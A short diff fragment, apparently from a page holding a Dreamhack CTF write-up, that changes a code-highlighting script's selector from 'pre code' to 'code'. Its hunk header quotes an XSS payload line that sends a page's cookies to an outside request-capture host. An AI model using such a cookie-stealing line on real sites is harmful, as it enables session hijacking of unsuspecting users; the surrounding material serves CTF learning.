@@ -186,7 +186,7 @@ img.src = "https://zgcsqwt.request.dreamhack.games/?cookie=" + cookieData;
 <script>
   (() => {
     window.patchCodeLine = (lineNumber, override) => {
-      const code = document.currentScript.previousElementSibling.querySelector('pre code');
+      const code = document.currentScript.previousElementSibling.querySelector('code');
 
       const patch = () => {
         const line = code.querySelector(`.code-line[value="${lineNumber}"]`);
